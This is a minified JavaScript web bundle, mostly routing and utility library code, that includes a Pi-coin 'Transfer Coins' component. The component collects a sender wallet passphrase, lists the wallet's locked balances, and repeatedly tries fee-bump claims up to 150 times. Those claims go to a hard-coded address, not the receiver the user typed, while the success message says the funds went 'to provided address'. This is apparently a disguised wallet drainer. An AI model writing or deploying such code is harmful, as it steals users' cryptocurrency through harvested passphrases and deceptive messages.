var supportedFormEncTypes = new Set(["application/x-www-form-urlencoded", "multipart/form-data", "text/plain"]);
function getFormEncType(_) {
    return _ != null && !supportedFormEncTypes.has(_) ? (warning(!1, `"${_}" is not a valid \`encType\` for \`<Form>\`/\`<fetcher.Form>\` and will default to "${defaultEncType}"`),
    null) : _
}
function getFormSubmissionInfo(_, M) {
    let j, O, x, w, b;
    if (isFormElement(_)) {
        let X = _.getAttribute("action");
        O = X ? stripBasename(X, M) : null,
        j = _.getAttribute("method") || defaultMethod,
        x = getFormEncType(_.getAttribute("enctype")) || defaultEncType,
        w = new FormData(_)
    } else if (isButtonElement(_) || isInputElement(_) && (_.type === "submit" || _.type === "image")) {
        let X = _.form;
        if (X == null)
            throw new Error('Cannot submit a <button> or <input type="submit"> without a <form>');
        let Y = _.getAttribute("formaction") || X.getAttribute("action");
        if (O = Y ? stripBasename(Y, M) : null,
        j = _.getAttribute("formmethod") || X.getAttribute("method") || defaultMethod,
        x = getFormEncType(_.getAttribute("formenctype")) || getFormEncType(X.getAttribute("enctype")) || defaultEncType,
        w = new FormData(X,_),
        !isFormDataSubmitterSupported()) {
            let {name: F, type: V, value: K} = _;
            if (V === "image") {
                let Q = F ? `${F}.` : "";
                w.append(`${Q}x`, "0"),
                w.append(`${Q}y`, "0")
            } else
                F && w.append(F, K)
        }
    } else {
        if (isHtmlElement(_))
            throw new Error('Cannot submit element that is not <form>, <button>, or <input type="submit|image">');
        j = defaultMethod,
        O = null,
        x = defaultEncType,
        b = _
    }
    return w && x === "text/plain" && (b = w,
    w = void 0),
    {
        action: O,
        method: j.toLowerCase(),
        encType: x,
        formData: w,
        body: b
    }
}
function invariant2(_, M) {
    if (_ === !1 || _ === null || typeof _ > "u")
        throw new Error(M)
}
async function loadRouteModule(_, M) {
    if (_.id in M)
        return M[_.id];
    try {
        let j = await import(_.module);
        return M[_.id] = j,
        j
    } catch (j) {
        return console.error(`Error loading route module \`${_.module}\`, reloading page...`),
        console.error(j),
        window.__reactRouterContext && window.__reactRouterContext.isSpaMode,
        window.location.reload(),
        new Promise( () => {}
        )
    }
}
function isHtmlLinkDescriptor(_) {
    return _ == null ? !1 : _.href == null ? _.rel === "preload" && typeof _.imageSrcSet == "string" && typeof _.imageSizes == "string" : typeof _.rel == "string" && typeof _.href == "string"
}
async function getKeyedPrefetchLinks(_, M, j) {
    let O = await Promise.all(_.map(async x => {
        let w = M.routes[x.route.id];
        if (w) {
            let b = await loadRouteModule(w, j);
            return b.links ? b.links() : []
        }
        return []
    }
    ));
    return dedupeLinkDescriptors(O.flat(1).filter(isHtmlLinkDescriptor).filter(x => x.rel === "stylesheet" || x.rel === "preload").map(x => x.rel === "stylesheet" ? {
        ...x,
        rel: "prefetch",
        as: "style"
    } : {
        ...x,
        rel: "prefetch"
    }))
}
function getNewMatchesForLinks(_, M, j, O, x, w) {
    let b = (Y, F) => j[F] ? Y.route.id !== j[F].route.id : !0
      , X = (Y, F) => {
        var V;
        return j[F].pathname !== Y.pathname || ((V = j[F].route.path) == null ? void 0 : V.endsWith("*")) && j[F].params["*"] !== Y.params["*"]
    }
    ;
    return w === "assets" ? M.filter( (Y, F) => b(Y, F) || X(Y, F)) : w === "data" ? M.filter( (Y, F) => {
        var K;
        let V = O.routes[Y.route.id];
        if (!V || !V.hasLoader)
            return !1;
        if (b(Y, F) || X(Y, F))
            return !0;
        if (Y.route.shouldRevalidate) {
            let Q = Y.route.shouldRevalidate({
                currentUrl: new URL(x.pathname + x.search + x.hash,window.origin),
                currentParams: ((K = j[0]) == null ? void 0 : K.params) || {},
                nextUrl: new URL(_,window.origin),
                nextParams: Y.params,
                defaultShouldRevalidate: !0
            });
            if (typeof Q == "boolean")
                return Q
        }
        return !0
    }
    ) : []
}
function getModuleLinkHrefs(_, M, {includeHydrateFallback: j}={}) {
    return dedupeHrefs(_.map(O => {
        let x = M.routes[O.route.id];
        if (!x)
            return [];
        let w = [x.module];
        return x.clientActionModule && (w = w.concat(x.clientActionModule)),
        x.clientLoaderModule && (w = w.concat(x.clientLoaderModule)),
        j && x.hydrateFallbackModule && (w = w.concat(x.hydrateFallbackModule)),
        x.imports && (w = w.concat(x.imports)),
        w
    }
    ).flat(1))
}
function dedupeHrefs(_) {
    return [...new Set(_)]
}
function sortKeys(_) {
    let M = {}
      , j = Object.keys(_).sort();
    for (let O of j)
        M[O] = _[O];
    return M
}
function dedupeLinkDescriptors(_, M) {
    let j = new Set;
    return new Set(M),
    _.reduce( (O, x) => {
        let w = JSON.stringify(sortKeys(x));
        return j.has(w) || (j.add(w),
        O.push({
            key: w,
            link: x
        })),
        O
    }
    , [])
}
Object.getOwnPropertyNames(Object.prototype).sort().join("\0");
var NO_BODY_STATUS_CODES = new Set([100, 101, 204, 205]);
function singleFetchUrl(_, M) {
    let j = typeof _ == "string" ? new URL(_,typeof window > "u" ? "server://singlefetch/" : window.location.origin) : _;
    return j.pathname === "/" ? j.pathname = "_root.data" : M && stripBasename(j.pathname, M) === "/" ? j.pathname = `${M.replace(/\/$/, "")}/_root.data` : j.pathname = `${j.pathname.replace(/\/$/, "")}.data`,
    j
}
function useDataRouterContext2() {
    let _ = reactExports.useContext(DataRouterContext);
    return invariant2(_, "You must render this element inside a <DataRouterContext.Provider> element"),
    _
}
function useDataRouterStateContext() {
    let _ = reactExports.useContext(DataRouterStateContext);
    return invariant2(_, "You must render this element inside a <DataRouterStateContext.Provider> element"),
    _
}
var FrameworkContext = reactExports.createContext(void 0);
FrameworkContext.displayName = "FrameworkContext";
function useFrameworkContext() {
    let _ = reactExports.useContext(FrameworkContext);
    return invariant2(_, "You must render this element inside a <HydratedRouter> element"),
    _
}
function usePrefetchBehavior(_, M) {
    let j = reactExports.useContext(FrameworkContext)
      , [O,x] = reactExports.useState(!1)
      , [w,b] = reactExports.useState(!1)
      , {onFocus: X, onBlur: Y, onMouseEnter: F, onMouseLeave: V, onTouchStart: K} = M
      , Q = reactExports.useRef(null);
    reactExports.useEffect( () => {
        if (_ === "render" && b(!0),
        _ === "viewport") {
            let ne = ue => {
                ue.forEach(fe => {
                    b(fe.isIntersecting)
                }
                )
            }
              , oe = new IntersectionObserver(ne,{
                threshold: .5
            });
            return Q.current && oe.observe(Q.current),
            () => {
                oe.disconnect()
            }
        }
    }
    , [_]),
    reactExports.useEffect( () => {
        if (O) {
            let ne = setTimeout( () => {
                b(!0)
            }
            , 100);
            return () => {
                clearTimeout(ne)
            }
        }
    }
    , [O]);
    let ee = () => {
        x(!0)
    }
      , ae = () => {
        x(!1),
        b(!1)
    }
    ;
    return j ? _ !== "intent" ? [w, Q, {}] : [w, Q, {
        onFocus: composeEventHandlers(X, ee),
        onBlur: composeEventHandlers(Y, ae),
        onMouseEnter: composeEventHandlers(F, ee),
        onMouseLeave: composeEventHandlers(V, ae),
        onTouchStart: composeEventHandlers(K, ee)
    }] : [!1, Q, {}]
}
function composeEventHandlers(_, M) {
    return j => {
        _ && _(j),
        j.defaultPrevented || M(j)
    }
}
function PrefetchPageLinks({page: _, ...M}) {
    let {router: j} = useDataRouterContext2()
      , O = reactExports.useMemo( () => matchRoutes(j.routes, _, j.basename), [j.routes, _, j.basename]);
    return O ? reactExports.createElement(PrefetchPageLinksImpl, {
        page: _,
        matches: O,
        ...M
    }) : null
}
function useKeyedPrefetchLinks(_) {
    let {manifest: M, routeModules: j} = useFrameworkContext()
      , [O,x] = reactExports.useState([]);
    return reactExports.useEffect( () => {
        let w = !1;
        return getKeyedPrefetchLinks(_, M, j).then(b => {
            w || x(b)
        }
        ),
        () => {
            w = !0
        }
    }
    , [_, M, j]),
    O
}
function PrefetchPageLinksImpl({page: _, matches: M, ...j}) {
    let O = useLocation()
      , {manifest: x, routeModules: w} = useFrameworkContext()
      , {basename: b} = useDataRouterContext2()
      , {loaderData: X, matches: Y} = useDataRouterStateContext()
      , F = reactExports.useMemo( () => getNewMatchesForLinks(_, M, Y, x, O, "data"), [_, M, Y, x, O])
      , V = reactExports.useMemo( () => getNewMatchesForLinks(_, M, Y, x, O, "assets"), [_, M, Y, x, O])
      , K = reactExports.useMemo( () => {
        if (_ === O.pathname + O.search + O.hash)
            return [];
        let ae = new Set
          , ne = !1;
        if (M.forEach(ue => {
            var he;
            let fe = x.routes[ue.route.id];
            !fe || !fe.hasLoader || (!F.some(pe => pe.route.id === ue.route.id) && ue.route.id in X && ((he = w[ue.route.id]) != null && he.shouldRevalidate) || fe.hasClientLoader ? ne = !0 : ae.add(ue.route.id))
        }
        ),
        ae.size === 0)
            return [];
        let oe = singleFetchUrl(_, b);
        return ne && ae.size > 0 && oe.searchParams.set("_routes", M.filter(ue => ae.has(ue.route.id)).map(ue => ue.route.id).join(",")),
        [oe.pathname + oe.search]
    }
    , [b, X, O, x, F, M, _, w])
      , Q = reactExports.useMemo( () => getModuleLinkHrefs(V, x), [V, x])
      , ee = useKeyedPrefetchLinks(V);
    return reactExports.createElement(reactExports.Fragment, null, K.map(ae => reactExports.createElement("link", {
        key: ae,
        rel: "prefetch",
        as: "fetch",
        href: ae,
        ...j
    })), Q.map(ae => reactExports.createElement("link", {
        key: ae,
        rel: "modulepreload",
        href: ae,
        ...j
    })), ee.map( ({key: ae, link: ne}) => reactExports.createElement("link", {
        key: ae,
        ...ne
    })))
}
function mergeRefs(..._) {
    return M => {
        _.forEach(j => {
            typeof j == "function" ? j(M) : j != null && (j.current = M)
        }
        )
    }
}
var isBrowser = typeof window < "u" && typeof window.document < "u" && typeof window.document.createElement < "u";
try {
    isBrowser && (window.__reactRouterVersion = "7.6.1")
} catch (_) {}
function BrowserRouter({basename: _, children: M, window: j}) {
    let O = reactExports.useRef();
    O.current == null && (O.current = createBrowserHistory({
        window: j,
        v5Compat: !0
    }));
    let x = O.current
      , [w,b] = reactExports.useState({
        action: x.action,
        location: x.location
    })
      , X = reactExports.useCallback(Y => {
        reactExports.startTransition( () => b(Y))
    }
    , [b]);
    return reactExports.useLayoutEffect( () => x.listen(X), [x, X]),
    reactExports.createElement(Router, {
        basename: _,
        children: M,
        location: w.location,
        navigationType: w.action,
        navigator: x
    })
}
var ABSOLUTE_URL_REGEX2 = /^(?:[a-z][a-z0-9+.-]*:|\/\/)/i
  , Link = reactExports.forwardRef(function _({onClick: M, discover: j="render", prefetch: O="none", relative: x, reloadDocument: w, replace: b, state: X, target: Y, to: F, preventScrollReset: V, viewTransition: K, ...Q}, ee) {
    let {basename: ae} = reactExports.useContext(NavigationContext), ne = typeof F == "string" && ABSOLUTE_URL_REGEX2.test(F), oe, ue = !1;
    if (typeof F == "string" && ne && (oe = F,
    isBrowser))
        try {
            let Ee = new URL(window.location.href)
              , Be = F.startsWith("//") ? new URL(Ee.protocol + F) : new URL(F)
              , ce = stripBasename(Be.pathname, ae);
            Be.origin === Ee.origin && ce != null ? F = ce + Be.search + Be.hash : ue = !0
        } catch {
            warning(!1, `<Link to="${F}"> contains an invalid URL which will probably break when clicked - please update to a valid URL path.`)
        }
    let fe = useHref(F, {
        relative: x
    })
      , [he,pe,ye] = usePrefetchBehavior(O, Q)
      , be = useLinkClickHandler(F, {
        replace: b,
        state: X,
        target: Y,
        preventScrollReset: V,
        relative: x,
        viewTransition: K
    });
    function xe(Ee) {
        M && M(Ee),
        Ee.defaultPrevented || be(Ee)
    }
    let Ae = reactExports.createElement("a", {
        ...Q,
        ...ye,
        href: oe || fe,
        onClick: ue || w ? M : xe,
        ref: mergeRefs(ee, pe),
        target: Y,
        "data-discover": !ne && j === "render" ? "true" : void 0
    });
    return he && !ne ? reactExports.createElement(reactExports.Fragment, null, Ae, reactExports.createElement(PrefetchPageLinks, {
        page: fe
    })) : Ae
});
Link.displayName = "Link";
var NavLink = reactExports.forwardRef(function _({"aria-current": M="page", caseSensitive: j=!1, className: O="", end: x=!1, style: w, to: b, viewTransition: X, children: Y, ...F}, V) {
    let K = useResolvedPath(b, {
        relative: F.relative
    })
      , Q = useLocation()
      , ee = reactExports.useContext(DataRouterStateContext)
      , {navigator: ae, basename: ne} = reactExports.useContext(NavigationContext)
      , oe = ee != null && useViewTransitionState(K) && X === !0
      , ue = ae.encodeLocation ? ae.encodeLocation(K).pathname : K.pathname
      , fe = Q.pathname
      , he = ee && ee.navigation && ee.navigation.location ? ee.navigation.location.pathname : null;
    j || (fe = fe.toLowerCase(),
    he = he ? he.toLowerCase() : null,
    ue = ue.toLowerCase()),
    he && ne && (he = stripBasename(he, ne) || he);
    const pe = ue !== "/" && ue.endsWith("/") ? ue.length - 1 : ue.length;
    let ye = fe === ue || !x && fe.startsWith(ue) && fe.charAt(pe) === "/", be = he != null && (he === ue || !x && he.startsWith(ue) && he.charAt(ue.length) === "/"), xe = {
        isActive: ye,
        isPending: be,
        isTransitioning: oe
    }, Ae = ye ? M : void 0, Ee;
    typeof O == "function" ? Ee = O(xe) : Ee = [O, ye ? "active" : null, be ? "pending" : null, oe ? "transitioning" : null].filter(Boolean).join(" ");
    let Be = typeof w == "function" ? w(xe) : w;
    return reactExports.createElement(Link, {
        ...F,
        "aria-current": Ae,
        className: Ee,
        ref: V,
        style: Be,
        to: b,
        viewTransition: X
    }, typeof Y == "function" ? Y(xe) : Y)
});
NavLink.displayName = "NavLink";
var Form = reactExports.forwardRef( ({discover: _="render", fetcherKey: M, navigate: j, reloadDocument: O, replace: x, state: w, method: b=defaultMethod, action: X, onSubmit: Y, relative: F, preventScrollReset: V, viewTransition: K, ...Q}, ee) => {
    let ae = useSubmit()
      , ne = useFormAction(X, {
        relative: F
    })
      , oe = b.toLowerCase() === "get" ? "get" : "post"
      , ue = typeof X == "string" && ABSOLUTE_URL_REGEX2.test(X)
      , fe = he => {
        if (Y && Y(he),
        he.defaultPrevented)
            return;
        he.preventDefault();
        let pe = he.nativeEvent.submitter
          , ye = (pe == null ? void 0 : pe.getAttribute("formmethod")) || b;
        ae(pe || he.currentTarget, {
            fetcherKey: M,
            method: ye,
            navigate: j,
            replace: x,
            state: w,
            relative: F,
            preventScrollReset: V,
            viewTransition: K
        })
    }
    ;
    return reactExports.createElement("form", {
        ref: ee,
        method: oe,
        action: ne,
        onSubmit: O ? Y : fe,
        ...Q,
        "data-discover": !ue && _ === "render" ? "true" : void 0
    })
}
);
Form.displayName = "Form";
function getDataRouterConsoleError2(_) {
    return `${_} must be used within a data router.  See https://reactrouter.com/en/main/routers/picking-a-router.`
}
function useDataRouterContext3(_) {
    let M = reactExports.useContext(DataRouterContext);
    return invariant(M, getDataRouterConsoleError2(_)),
    M
}
function useLinkClickHandler(_, {target: M, replace: j, state: O, preventScrollReset: x, relative: w, viewTransition: b}={}) {
    let X = useNavigate()
      , Y = useLocation()
      , F = useResolvedPath(_, {
        relative: w
    });
    return reactExports.useCallback(V => {
        if (shouldProcessLinkClick(V, M)) {
            V.preventDefault();
            let K = j !== void 0 ? j : createPath(Y) === createPath(F);
            X(_, {
                replace: K,
                state: O,
                preventScrollReset: x,
                relative: w,
                viewTransition: b
            })
        }
    }
    , [Y, X, F, j, O, M, _, x, w, b])
}
var fetcherId = 0
  , getUniqueFetcherId = () => `__${String(++fetcherId)}__`;
function useSubmit() {
    let {router: _} = useDataRouterContext3("useSubmit")
      , {basename: M} = reactExports.useContext(NavigationContext)
      , j = useRouteId();
    return reactExports.useCallback(async (O, x={}) => {
        let {action: w, method: b, encType: X, formData: Y, body: F} = getFormSubmissionInfo(O, M);
        if (x.navigate === !1) {
            let V = x.fetcherKey || getUniqueFetcherId();
            await _.fetch(V, j, x.action || w, {
                preventScrollReset: x.preventScrollReset,
                formData: Y,
                body: F,
                formMethod: x.method || b,
                formEncType: x.encType || X,
                flushSync: x.flushSync
            })
        } else
            await _.navigate(x.action || w, {
                preventScrollReset: x.preventScrollReset,
                formData: Y,
                body: F,
                formMethod: x.method || b,
                formEncType: x.encType || X,
                replace: x.replace,
                state: x.state,
                fromRouteId: j,
                flushSync: x.flushSync,
                viewTransition: x.viewTransition
            })
    }
    , [_, M, j])
}
function useFormAction(_, {relative: M}={}) {
    let {basename: j} = reactExports.useContext(NavigationContext)
      , O = reactExports.useContext(RouteContext);
    invariant(O, "useFormAction must be used inside a RouteContext");
    let[x] = O.matches.slice(-1)
      , w = {
        ...useResolvedPath(_ || ".", {
            relative: M
        })
    }
      , b = useLocation();
    if (_ == null) {
        w.search = b.search;
        let X = new URLSearchParams(w.search)
          , Y = X.getAll("index");
        if (Y.some(V => V === "")) {
            X.delete("index"),
            Y.filter(K => K).forEach(K => X.append("index", K));
            let V = X.toString();
            w.search = V ? `?${V}` : ""
        }
    }
    return (!_ || _ === ".") && x.route.index && (w.search = w.search ? w.search.replace(/^\?/, "?index&") : "?index"),
    j !== "/" && (w.pathname = w.pathname === "/" ? j : joinPaths([j, w.pathname])),
    createPath(w)
}
function useViewTransitionState(_, M={}) {
    let j = reactExports.useContext(ViewTransitionContext);
    invariant(j != null, "`useViewTransitionState` must be used within `react-router-dom`'s `RouterProvider`.  Did you accidentally import `RouterProvider` from `react-router`?");
    let {basename: O} = useDataRouterContext3("useViewTransitionState")
      , x = useResolvedPath(_, {
        relative: M.relative
    });
    if (!j.isTransitioning)
        return !1;
    let w = stripBasename(j.currentLocation.pathname, O) || j.currentLocation.pathname
      , b = stripBasename(j.nextLocation.pathname, O) || j.nextLocation.pathname;
    return matchPath(x.pathname, b) != null || matchPath(x.pathname, w) != null
}
[...NO_BODY_STATUS_CODES];
const TransferPiReceiverPayFee = () => {
    const [_,M] = reactExports.useState(!1)
      , [j,O] = reactExports.useState("")
      , [x,w] = reactExports.useState("")
      , [b,X] = reactExports.useState([])
      , [Y,F] = reactExports.useState(null)
      , [V,K] = reactExports.useState(!1)
      , [Q,ee] = reactExports.useState()
      , [ae,ne] = reactExports.useState()
      , [oe,ue] = reactExports.useState(0)
      , [fe,he] = reactExports.useState([])
      , pe = 150;
    reactExports.useEffect( () => {
        ye(j)
    }
    , [j]);
    async function ye(xe) {
        const Ae = generateWalletKeypair(xe)
          , Ee = generateFeePayerKeypair(x);
        ee(Ae),
        ne(Ee);
        const ce = (await getClaimableBalance(Ae.publicKey())).records.map(q => {
            var L;
            return {
                id: q.id,
                amount: q.amount,
                abs_before: (L = q.claimants[0].predicate.not) == null ? void 0 : L.abs_before
            }
        }
        );
        X(ce)
    }
    async function be() {
        var Ee, Be, ce, q, L;
        if (!Q || !ae)
            return;
        K(!0);
        let xe = !1
          , Ae = 0;
        for (; !xe && Ae < pe; ) {
            await ye(j);
            const U = b.find(Z => Z.id === Y);
            if (U && Y) {
                console.log("attempting fee bump");
                let Z = await createFeeBumpTransaction(Q == null ? void 0 : Q.publicKey(), "GA2CXP2KK2PANC3JDEZLRKONYZBWXMTHY3N235QNJQFGGTJRUMPNM75X", Y, U == null ? void 0 : U.amount, 1, Q, ae, Ae);
                xe = Z.success,
                console.log(xe);
                const se = new Date(Date.now()).toLocaleTimeString("en-US", {
                    hour12: !1
                });
                let de = {
                    sender: Q.publicKey(),
                    receiver: x,
                    amount: U.amount,
                    message: "",
                    details: "",
                    success: Z.success,
                    time: se,
                    action: "Tried claiming PI",
                    type: "Fee Bump Claiming",
                    txHash: Z.txHash
                };
                Z.success ? de = {
                    ...de,
                    message: "Transaction was successful",
                    details: `${U.amount} Pi was claimed and sent to provided address`
                } : Z.errorType === "stellar" ? (((Ee = Z.resultCodes) == null ? void 0 : Ee.transaction) === "tx_insufficient_fee" && (de = {
                    ...de,
                    message: Z.message,
                    details: "Not enough fee"
                }),
                ((Be = Z.resultCodes) == null ? void 0 : Be.transaction) === "op_underfunded" && (de = {
                    ...de,
                    message: Z.message,
                    details: "Insufficient balance"
                }),
                ((ce = Z.resultCodes) == null ? void 0 : ce.transaction) === "tx_bad_auth" && (de = {
                    ...de,
                    message: Z.message,
                    details: "Invalid signature"
                }),
                ((q = Z.resultCodes) == null ? void 0 : q.transaction) === "op_no_destination" && (de = {
                    ...de,
                    message: Z.message,
                    details: "Invalid destination wallet address"
                }),
                ((L = Z.resultCodes) == null ? void 0 : L.transaction) === "op_claimable_balance_not_found" && (de = {
                    ...de,
                    message: Z.message,
                    details: "Balance not found, or already claimed"
                })) : de = {
                    ...de,
                    message: Z.message,
                    details: "Unknown error occured"
                },
                he(re => [...re, de])
            }
            Ae++,
            ue(Ae)
        }
        K(!1)
    }
    return jsxRuntimeExports.jsxs("div", {
        className: "flex flex-col gap-7 justify-start w-full px-2",
        children: [jsxRuntimeExports.jsxs(p$3, {
            direction: "column",
            children: [jsxRuntimeExports.jsx(p$8, {
                className: "text-base md:text-2xl font-semibold text-gray-300",
                children: "Transfer Coins"
            }), jsxRuntimeExports.jsx(p$8, {
                className: "md:text-sm text-xs font-medium text-gray-500",
                children: "Fill in the below form correctly"
            })]
        }), jsxRuntimeExports.jsxs(p$3, {
            direction: "column",
            gap: "1",
            children: [jsxRuntimeExports.jsx(y$1, {
                className: "font-medium text-base !text-gray-100",
                children: "Sender Wallet Passphrase"
            }), jsxRuntimeExports.jsx(u, {
                type: _ ? "text" : "password",
                value: j,
                onChange: xe => O(xe.currentTarget.value),
                placeholder: "Enter sender wallet passphrase...",
                className: "flex items-center justify-between !bg-transparent !text-gray-300 placeholder:!text-gray-400 border-2 border-gray-300 focus:outline-0 focus:ring-0 custom-input w-full",
                size: "3",
                children: jsxRuntimeExports.jsx(c, {
                    side: "right",
                    children: jsxRuntimeExports.jsx(o$2, {
                        onClick: () => M(!_),
                        size: "2",
                        variant: "ghost",
                        children: jsxRuntimeExports.jsx(FaEye, {
                            height: "16",
                            width: "16",
                            className: "text-gray-50"
                        })
                    })
                })
            })]
        }), jsxRuntimeExports.jsxs(p$3, {
            direction: "column",
            gap: "1",
            children: [jsxRuntimeExports.jsx(y$1, {
                className: "font-medium text-base !text-gray-100",
                children: "Receiver wallet passphrase"
            }), jsxRuntimeExports.jsx(u, {
                type: _ ? "text" : "password",
                value: x,
                onChange: xe => w(xe.currentTarget.value),
                placeholder: "Enter receiver wallet address...",
                className: "flex items-center justify-between !bg-transparent !text-gray-300 placeholder:!text-gray-400 border-2 border-gray-300 focus:outline-0 focus:ring-0 custom-input w-full cursor-not-allowed",
                size: "3"
            })]
        }), jsxRuntimeExports.jsxs(p$3, {
            direction: "column",
            gap: "1",
            children: [jsxRuntimeExports.jsx(y$1, {
                className: "font-medium text-base !text-gray-100",
                children: "Locked Balances"
            }), jsxRuntimeExports.jsxs(C, {
                value: Y ?? "",
                onValueChange: F,
                children: [jsxRuntimeExports.jsx(u$1, {
                    className: "bg-transparent",
                    placeholder: "Select locked balance"
                }), jsxRuntimeExports.jsx(g, {
                    className: "bg-transparent",
                    children: b.map( (xe, Ae) => jsxRuntimeExports.jsx(v, {
                        className: "font-semibold",
                        value: xe.id,
                        children: `Balance #${Ae + 1} - ${xe.amount} PI`
                    }, xe.id))
                })]
            })]
        }), jsxRuntimeExports.jsx(o$4, {
            loading: V,
            onClick: be,
            type: "button",
            className: "!bg-emerald-600",
            children: "Transfer Pi"
        }), fe.length ? jsxRuntimeExports.jsx(TransactionBlocks, {
            attemptsArray: fe,
            attempts: oe,
            maxAttemps: pe
        }) : "", jsxRuntimeExports.jsx(jsxRuntimeExports.Fragment, {
            children: jsxRuntimeExports.jsx("style", {
                children: `
					.rt-TextFieldInput::placeholder {
						color: gray;
						opacity: 1; /* for Firefox */
					}
						input:disabled {
							background: #121e31;
							color: white;
							cursor: not-allowed;
						}
					`
            })
        })]
    })
}
  , ReceiverPay = () => jsxRuntimeExports.jsx("main", {
    className: "min-h-full w-full bg-slate-900 text-slate-50 flex justify-center items-center flex-col gap-2 p-2",
    children: jsxRuntimeExports.jsxs("div", {
        className: "w-full h-full md:w-1/2 flex flex-col justify-center items-center border md:min-h-96 border-slate-700 md:rounded-xl p-2 gap-4",
        children: [jsxRuntimeExports.jsx(BotHeader, {}), jsxRuntimeExports.jsx(o, {
            className: "border-b border-b-gray-800",
            my: "3",
            size: "4"
        }), jsxRuntimeExports.jsx(TransferPiReceiverPayFee, {})]
    })
});
function bind(_, M) {
    return function() {
        return _.apply(M, arguments)
    }
}
const {toString} = Object.prototype
  , {getPrototypeOf} = Object
  , {iterator, toStringTag} = Symbol
  , kindOf = (_ => M => {
    const j = toString.call(M);
    return _[j] || (_[j] = j.slice(8, -1).toLowerCase())
}
)(Object.create(null))
  , kindOfTest = _ => (_ = _.toLowerCase(),
M => kindOf(M) === _)
  , typeOfTest = _ => M => typeof M === _
  , {isArray} = Array
  , isUndefined = typeOfTest("undefined");
function isBuffer(_) {
    return _ !== null && !isUndefined(_) && _.constructor !== null && !isUndefined(_.constructor) && isFunction(_.constructor.isBuffer) && _.constructor.isBuffer(_)
}
const isArrayBuffer = kindOfTest("ArrayBuffer");
function isArrayBufferView(_) {
    let M;
    return typeof ArrayBuffer < "u" && ArrayBuffer.isView ? M = ArrayBuffer.isView(_) : M = _ && _.buffer && isArrayBuffer(_.buffer),
    M
}
const isString = typeOfTest("string")
  , isFunction = typeOfTest("function")
  , isNumber = typeOfTest("number")
  , isObject = _ => _ !== null && typeof _ == "object"
  , isBoolean = _ => _ === !0 || _ === !1
  , isPlainObject = _ => {
    if (kindOf(_) !== "object")
        return !1;
    const M = getPrototypeOf(_);
    return (M === null || M === Object.prototype || Object.getPrototypeOf(M) === null) && !(toStringTag in _) && !(iterator in _)
}
  , isDate = kindOfTest("Date")
  , isFile = kindOfTest("File")
  , isBlob = kindOfTest("Blob")
  , isFileList = kindOfTest("FileList")
  , isStream = _ => isObject(_) && isFunction(_.pipe)
  , isFormData = _ => {
    let M;
    return _ && (typeof FormData == "function" && _ instanceof FormData || isFunction(_.append) && ((M = kindOf(_)) === "formdata" || M === "object" && isFunction(_.toString) && _.toString() === "[object FormData]"))
}
  , isURLSearchParams = kindOfTest("URLSearchParams")
  , [isReadableStream,isRequest,isResponse,isHeaders] = ["ReadableStream", "Request", "Response", "Headers"].map(kindOfTest)
  , trim = _ => _.trim ? _.trim() : _.replace(/^[\s\uFEFF\xA0]+|[\s\uFEFF\xA0]+$/g, "");
function forEach(_, M, {allOwnKeys: j=!1}={}) {
    if (_ === null || typeof _ > "u")
        return;
    let O, x;
    if (typeof _ != "object" && (_ = [_]),
    isArray(_))
        for (O = 0,
        x = _.length; O < x; O++)
            M.call(null, _[O], O, _);
    else {
        const w = j ? Object.getOwnPropertyNames(_) : Object.keys(_)
          , b = w.length;
        let X;
        for (O = 0; O < b; O++)
            X = w[O],
            M.call(null, _[X], X, _)
    }
}
function findKey(_, M) {
    M = M.toLowerCase();
    const j = Object.keys(_);
    let O = j.length, x;
    for (; O-- > 0; )
        if (x = j[O],
        M === x.toLowerCase())
            return x;
    return null
}
const _global = typeof globalThis < "u" ? globalThis : typeof self < "u" ? self : window
  , isContextDefined = _ => !isUndefined(_) && _ !== _global;
function merge() {
    const {caseless: _} = isContextDefined(this) && this || {}
      , M = {}
      , j = (O, x) => {
        const w = _ && findKey(M, x) || x;
        isPlainObject(M[w]) && isPlainObject(O) ? M[w] = merge(M[w], O) : isPlainObject(O) ? M[w] = merge({}, O) : isArray(O) ? M[w] = O.slice() : M[w] = O
    }
    ;
    for (let O = 0, x = arguments.length; O < x; O++)
        arguments[O] && forEach(arguments[O], j);
    return M
}
const extend = (_, M, j, {allOwnKeys: O}={}) => (forEach(M, (x, w) => {
    j && isFunction(x) ? _[w] = bind(x, j) : _[w] = x
}
, {
    allOwnKeys: O
}),
_)
  , stripBOM = _ => (_.charCodeAt(0) === 65279 && (_ = _.slice(1)),
_)
  , inherits = (_, M, j, O) => {
    _.prototype = Object.create(M.prototype, O),
    _.prototype.constructor = _,
    Object.defineProperty(_, "super", {
        value: M.prototype
    }),
    j && Object.assign(_.prototype, j)
}
  , toFlatObject = (_, M, j, O) => {
    let x, w, b;
    const X = {};
    if (M = M || {},
    _ == null)
        return M;
    do {
        for (x = Object.getOwnPropertyNames(_),
        w = x.length; w-- > 0; )
            b = x[w],
            (!O || O(b, _, M)) && !X[b] && (M[b] = _[b],
            X[b] = !0);
        _ = j !== !1 && getPrototypeOf(_)
    } while (_ && (!j || j(_, M)) && _ !== Object.prototype);
    return M
}
  , endsWith = (_, M, j) => {
    _ = String(_),
    (j === void 0 || j > _.length) && (j = _.length),
    j -= M.length;
    const O = _.indexOf(M, j);
    return O !== -1 && O === j
}
  , toArray = _ => {
    if (!_)
        return null;
    if (isArray(_))
        return _;
    let M = _.length;
    if (!isNumber(M))
        return null;
    const j = new Array(M);
    for (; M-- > 0; )
        j[M] = _[M];
    return j
}
  , isTypedArray = (_ => M => _ && M instanceof _)(typeof Uint8Array < "u" && getPrototypeOf(Uint8Array))
  , forEachEntry = (_, M) => {
    const O = (_ && _[iterator]).call(_);
    let x;
    for (; (x = O.next()) && !x.done; ) {
        const w = x.value;
        M.call(_, w[0], w[1])
    }
}
  , matchAll = (_, M) => {
    let j;
    const O = [];
    for (; (j = _.exec(M)) !== null; )
        O.push(j);
    return O
}
  , isHTMLForm = kindOfTest("HTMLFormElement")
  , toCamelCase = _ => _.toLowerCase().replace(/[-_\s]([a-z\d])(\w*)/g, function(j, O, x) {
    return O.toUpperCase() + x
})
  , hasOwnProperty = ( ({hasOwnProperty: _}) => (M, j) => _.call(M, j))(Object.prototype)
  , isRegExp = kindOfTest("RegExp")
  , reduceDescriptors = (_, M) => {
    const j = Object.getOwnPropertyDescriptors(_)
      , O = {};
    forEach(j, (x, w) => {
        let b;
        (b = M(x, w, _)) !== !1 && (O[w] = b || x)
    }
    ),
    Object.defineProperties(_, O)
}
  , freezeMethods = _ => {
    reduceDescriptors(_, (M, j) => {
        if (isFunction(_) && ["arguments", "caller", "callee"].indexOf(j) !== -1)
            return !1;
        const O = _[j];
        if (isFunction(O)) {
            if (M.enumerable = !1,
            "writable"in M) {
